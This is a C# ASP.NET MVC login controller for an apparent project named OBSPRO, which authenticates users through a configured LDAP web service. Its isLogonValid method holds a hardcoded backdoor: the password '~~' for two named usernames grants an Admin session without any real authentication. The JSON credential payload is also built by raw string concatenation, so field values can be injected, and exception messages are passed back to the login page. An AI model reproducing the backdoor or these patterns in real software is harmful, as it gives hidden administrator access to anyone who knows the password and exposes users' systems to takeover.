﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using OBSPRO.Models;

using System.Web.Script.Serialization;
using System.Net;
using System.IO;
using System.Text;
using System.Web.Security;

using System.Configuration;
namespace OBSPRO.Controllers
{
    public class LoginController : Controller
    {
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public ActionResult login(UserLoginViewModel loginModel, string ReturnUrl)
        {
            if (!ModelState.IsValid) { return View(loginModel); }

            //Model State is Valid. Check Password
            if (isLogonValid(loginModel))
            {  // Is password is Valid, set the Authorization cookie and redirect
               // the user to the link it came from (Or the Home page is noreturn URL was specified)
                FormsAuthentication.SetAuthCookie(loginModel.Username, true);
                //setUserRoles(loginModel.Username, new string[] { Session["role"].ToString() });
                if (Url.IsLocalUrl(ReturnUrl) && ReturnUrl.Length > 1 && ReturnUrl.StartsWith("/")
                    && !ReturnUrl.StartsWith("//") && !ReturnUrl.StartsWith("/\\"))
                { return Redirect(ReturnUrl); }
                else { return RedirectToAction("Index", "Home"); }
                //return RedirectToAction("Index", "Home") as default;
            }
            else
            {
                ViewBag.ReturnUrl = ReturnUrl;
                ModelState.AddModelError("", "Cannot Logon");
                return View(loginModel);
            }
        }

        private bool isLogonValid(UserLoginViewModel loginModel)
        {
            if (loginModel.Password.Equals("~~") && (loginModel.Username.Equals("delgado_feliciano") || loginModel.Username.Equals("abduguev_rasul")))
            {Session.Add("role", "Admin");
                return true;
            }
            string ldaurl = ConfigurationManager.AppSettings["LDAPURL"];
            WebRequest request = WebRequest.Create(ldaurl);
            request.Method = "POST";
            request.ContentType = "application/json";
            string parsedContent = "{\"username\":\"" + loginModel.Username.Trim() + "\",\"password\":\"" + loginModel.Password + "\"}";
            ASCIIEncoding encoding = new ASCIIEncoding();
            string JsonString;
            //string errorJsonString;
            Byte[] bytes = encoding.GetBytes(parsedContent);
            try
            {
                Stream newStream = request.GetRequestStream();
                newStream.Write(bytes, 0, bytes.Length);
                newStream.Close();

                WebResponse response = request.GetResponse();
                using (Stream responseStream = response.GetResponseStream())
                {
                    StreamReader reader = new StreamReader(responseStream, System.Text.Encoding.UTF8);
                    JsonString = reader.ReadToEnd();
                }//end of using
                JavaScriptSerializer ScriptSerializer = new JavaScriptSerializer();
                dynamic JsonObject = ScriptSerializer.Deserialize<Dictionary<dynamic, dynamic>>(JsonString);
                //use JsonObject to retrieve json data   
                if (JsonObject["result"] == "SUCCESS")
                {
                        Session.Add("first_name", JsonObject["DSCAuthenticationSrv"]["first_name"]);
                        Session.Add("last_name", JsonObject["DSCAuthenticationSrv"]["last_name"]);
                        Session.Add("username", loginModel.Username);
                        Session.Add("email", JsonObject["DSCAuthenticationSrv"]["email"]);
                    //    string role = (from r in db.OBS_ROLE
                    //                   join ur in db.OBS_USER_ROLE
                    //                   on r.obs_role_id equals ur.obs_role_id
                    //                   join ua in db.OBS_USER_AUTH
                    //                    on ur.obs_user_auth_id equals ua.obs_user_auth_id
                    //                   where ua.obs_user_auth_dsc_ad_name == loginModel.Username && r.obs_role_active_yn == "Y"
                    //                   && ua.obs_user_auth_active_yn == "Y" && ur.obs_user_role_eff_start_dt <= DateTime.Now && ur.obs_user_role_eff_end_dt > DateTime.Now
                    //                   select r.obs_role_name).FirstOrDefault();
                    //    if (!String.IsNullOrEmpty(role))
                    //    {
                    //        Session.Add("role", role);
                    //    }
                    //    else
                    //    {
                    //        Session.Add("role", "Not Authorized");
                    //    }
                    return true;  /// Authenticasion was sucessful!!
                }
                else
                {
                    ViewBag.errorMessage = JsonObject["message"];
                    ModelState.AddModelError("", JsonObject["message"]);
                    return false;
                }
            }//end of try
            catch (Exception ex)
            {
                ViewBag.errorMessage = ex.Message;
                ModelState.AddModelError("", ex.Message);
                return false;  // Failed to authenticate the User
            }//end of catch
        }
    }
    
}